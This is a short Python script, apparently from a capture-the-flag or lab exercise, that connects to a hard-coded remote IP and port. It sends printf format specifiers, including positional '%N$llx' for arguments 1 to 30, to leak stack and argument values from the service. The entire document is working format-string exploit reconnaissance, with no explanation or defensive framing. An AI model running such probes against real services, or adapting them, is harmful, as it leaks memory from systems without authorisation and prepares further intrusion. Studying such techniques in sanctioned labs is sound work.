#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642

def conn():
    s=socket.socket(); s.settimeout(1.5); s.connect((HOST,PORT)); s.recv(300); return s

def test(txt):
    try:
        s=conn()
        s.send(txt)
        d=b''
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                d+=c
        except Exception: pass
        s.close(); return d
    except Exception as e:
        return b'ERR:'+str(e).encode()

# test hex formats
print("=== hex format tests ===")
for spec in ["%p","%llx","%lx","%x","%08x","%llu"]:
    print(spec, "=>", repr(test((spec+"\n").encode())))
    time.sleep(0.1)

# leak args as hex (llx) and as lld and as d
print("=== leak args ===")
def leak(n):
    r = test(("%%%d$llx\n" % n).encode())
    time.sleep(0.06)
    return r
for n in range(1, 31):
    print(n, repr(leak(n)))
